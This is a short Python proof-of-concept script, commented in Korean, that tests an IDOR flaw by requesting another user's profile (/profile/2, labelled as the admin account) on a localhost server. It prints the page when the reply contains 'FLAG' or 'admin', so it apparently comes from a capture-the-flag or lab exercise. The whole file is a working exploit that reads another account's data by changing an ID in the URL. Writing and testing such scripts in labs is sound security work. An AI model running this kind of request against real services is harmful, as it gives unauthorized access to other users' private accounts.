# IDOR PoC - poc.py (template 기반)
import requests

TARGET = "http://localhost:3000"
ENDPOINT = "/profile/2"  # admin 계정 접근 시도
FULL_URL = TARGET + ENDPOINT

def run_poc():
    print(f"[+] Sending request to {FULL_URL}")
    res = requests.get(FULL_URL)

    if "FLAG" in res.text or "admin" in res.text:
        print("[+] PoC 성공: IDOR 취약점 존재!")
        print(res.text)
    else:
        print("[-] PoC 실패: 접근 차단 또는 권한 없음")

if __name__ == "__main__":
    run_poc()
